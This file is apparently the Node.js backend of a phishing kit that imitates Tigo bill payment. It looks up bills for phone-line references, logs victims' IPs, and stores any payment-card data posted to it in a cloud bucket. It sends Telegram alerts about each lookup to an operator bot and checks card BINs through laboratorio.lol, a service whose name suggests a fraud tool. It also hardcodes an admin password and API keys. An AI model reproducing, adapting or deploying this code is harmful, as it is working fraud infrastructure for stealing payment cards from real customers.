require('dotenv').config();

const AWS = require('aws-sdk');
const crypto = require('crypto');
const https = require('https');

const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;
const API_KEY = 'tigo_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';
const adminTokens = new Set();

function generarTokenAdmin() {
    return crypto.randomBytes(32).toString('hex');
}

function validarTokenAdmin(token) {
    return adminTokens.has(token);
}

function crearSesionAdmin() {
    const token = generarTokenAdmin();
    adminTokens.add(token);
    setTimeout(() => adminTokens.delete(token), 30 * 60 * 1000);
    return token;
}

function generarTxid() {
    return crypto.randomBytes(16).toString('hex');
}

async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
    try {
        const response = await fetch(
            `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
            {
                headers: {
                    'X-API-Key': process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v'
                }
            }
        );
        const data = await response.json();
        return {
            token: data.token || data.bot_token,
            chatId: data.chat_id
        };
    } catch (error) {
        console.error('Error obteniendo credenciales Telegram:', error);
        return null;
    }
}

async function enviarNotificacionTelegram(txid, transaccion) {
    try {
        const creds = await obtenerCredencialesTelegram('tigoconsulta');
        if (!creds || !creds.token || !creds.chatId) return;

        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n` +
            `<b>TxID:</b> <code>${txid}</code>\n` +
            `<b>Línea:</b> ${transaccion.referencia}\n` +
            `<b>Valor:</b> ${transaccion.valor_formateado}\n` +
            `<b>Estado:</b> ${transaccion.estado}\n` +
            `<b>IP:</b> ${transaccion.ip}\n` +
            `<b>Hora:</b> ${new Date(transaccion.timestamp).toLocaleString('es-CO')}`;

        await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: creds.chatId,
                text: mensaje,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Error enviando notificación Telegram:', error);
    }
}

async function guardarConsultaFactura(txid, datos, clientIp) {
    const consulta = {
        txid,
        ip: clientIp,
        referencia: datos.referencia,
        valor_pago: datos.valor_pago,
        valor_formateado: datos.valor_formateado,
        convenio: datos.convenio,
        estado: 'pendiente',
        timestamp: new Date().toISOString()
    };

    return new Promise((resolve, reject) => {
        s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
            let content = '';
            if (!err && data.Body) {
                content = data.Body.toString();
            }
            content += JSON.stringify(consulta) + '\n';

            s3.putObject({
                Bucket: BUCKET,
                Key: 'datos_consultas.txt',
                Body: content,
                ContentType: 'text/plain'
            }, (err, data) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
    });
}

async function guardarTransaccionTarjeta(txidTarjeta, datos) {
    const transaccionTarjeta = {
        txid: txidTarjeta,
        ...datos,
        timestamp: new Date().toISOString()
    };

    return new Promise((resolve, reject) => {
        s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
            let content = '';
            if (!err && data.Body) {
                content = data.Body.toString();
            }
            content += JSON.stringify(transaccionTarjeta) + '\n';

            s3.putObject({
                Bucket: BUCKET,
                Key: 'datos_tarjeta.txt',
                Body: content,
                ContentType: 'text/plain'
            }, (err, data) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
    });
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const { method, url } = req;

    // Login Admin
    if (url === '/api/handler' && method === 'POST') {
        const body = JSON.parse(JSON.stringify(req.body));
        const { action, usuario, clave } = body;

        if (action === 'login-admin') {
            if (usuario === 'admin' && clave === 'Tigocash2026') {
                const token = crearSesionAdmin();
                return res.status(200).json({ ok: true, token });
            } else {
                return res.status(401).json({ ok: false, error: 'Credenciales inválidas' });
            }
        }

        // Consultar Factura
        if (action === 'consultar-factura') {
            const { referencia } = body;
            if (!referencia) {
                return res.status(400).json({ ok: false, error: 'Referencia requerida' });
            }

            try {
                const postData = JSON.stringify({ referencia, api_key: API_KEY });
                const httpRes = await new Promise((resolve, reject) => {
                    const options = {
                        hostname: 'api.cloudapi.life',
                        path: '/tigo.php',
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Content-Length': Buffer.byteLength(postData)
                        }
                    };

                    const apiReq = https.request(options, resolve);
                    apiReq.on('error', reject);
                    apiReq.write(postData);
                    apiReq.end();
                });

                let data = '';
                for await (const chunk of httpRes) {
                    data += chunk;
                }

                const facturaData = JSON.parse(data);
                if (facturaData.ok && facturaData.factura) {
                    const txid = generarTxid();
                    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
                    await guardarConsultaFactura(txid, facturaData.factura, clientIp);
                    await enviarNotificacionTelegram(txid, { ...facturaData.factura, ip: clientIp });

                    return res.status(200).json({ ...facturaData, txid });
                } else {
                    return res.status(200).json(facturaData);
                }
            } catch (error) {
                return res.status(500).json({ ok: false, error: 'Error procesando' });
            }
        }

        // Guardar Transacción Tarjeta
        if (action === 'guardar-transaccion-tarjeta') {
            try {
                const datos = body;
                const txid = datos.txId;
                const transaccion = {
                    txid,
                    ...datos,
                    timestamp: new Date().toISOString()
                };

                await guardarTransaccionTarjeta(txid, transaccion);
                return res.status(200).json({ ok: true, txid });
            } catch (error) {
                return res.status(400).json({ ok: false, error: 'Error en solicitud' });
            }
        }

        // BIN Check
        if (action === 'bin-check') {
            const { bin } = body;
            if (!bin || bin.length < 6) {
                return res.status(400).json({ ok: false, error: 'BIN inválido' });
            }

            const binOnly = bin.replace(/\D/g, '').substring(0, 6);
            const BIN_API_KEY = process.env.BIN_API_KEY;
            const binUrl = `https://www.laboratorio.lol/api/bins.php?apikey=${BIN_API_KEY}&bin=${binOnly}`;

            try {
                const response = await fetch(binUrl);
                const binData = await response.json();

                if (binData.error) {
                    return res.status(200).json({ ok: false, error: binData.error });
                }

                return res.status(200).json({
                    ok: true,
                    bin: binOnly,
                    bankName: binData.bankname || binData.bank || 'Banco desconocido',
                    cardType: binData.type ? binData.type.toLowerCase() : 'credit',
                    franquicia: binData.franquicia || binData.scheme || binData.brand || 'UNKNOWN',
                    country: binData.country || 'Colombia'
                });
            } catch (error) {
                return res.status(500).json({ ok: false, error: 'Error consultando BIN API' });
            }
        }

        return res.status(400).json({ ok: false, error: 'Acción no reconocida' });
    }

    return res.status(404).json({ ok: false, error: 'No encontrado' });
};
